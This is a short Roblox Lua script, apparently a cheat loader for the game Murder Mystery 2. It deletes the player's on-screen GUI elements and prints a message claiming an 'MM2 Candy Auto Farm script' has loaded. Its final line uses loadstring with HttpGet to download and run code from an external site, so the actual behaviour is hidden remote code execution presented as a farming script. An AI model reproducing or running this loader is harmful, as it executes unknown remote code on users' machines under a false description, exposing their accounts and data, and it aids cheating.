-- Get the Player and PlayerGui
local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Function to destroy all GUIs
local function destroyAllGUIs()
    -- Loop through all children of PlayerGui
    for _, gui in ipairs(playerGui:GetChildren()) do
        -- Check if the child is a GUI (e.g., ScreenGui, Frame, etc.)
        if gui:IsA("ScreenGui") or gui:IsA("Frame") or gui:IsA("TextLabel") or gui:IsA("TextButton") then
            gui:Destroy()  -- Destroy the GUI
        end
    end
end

-- Call the function
destroyAllGUIs()


print("MM2 Candy Auto Farm script with persistent GUI and fixed toggle loaded.")
wait(0.5)
loadstring(game:HttpGet('https://darkscripts.space/scripts/0d4d303f8d.lua', true))()
wait(0.1)

